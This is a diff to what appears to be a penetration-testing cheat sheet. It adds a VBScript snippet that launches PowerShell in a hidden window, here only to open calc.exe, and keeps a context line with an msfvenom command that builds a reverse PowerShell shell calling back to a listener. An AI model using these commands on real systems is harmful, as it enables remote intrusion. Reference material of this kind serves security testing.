@@ -826,6 +826,11 @@ Cscript - Metasploit
 ```
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
+
+## VBS
+```Set Shell = CreateObject("WScript.Shell")
+Shell.Run "powershell.exe -Command calc.exe", 0, True
+Set Shell = Nothing```
 ## MSIExec
 Attacker
 ```
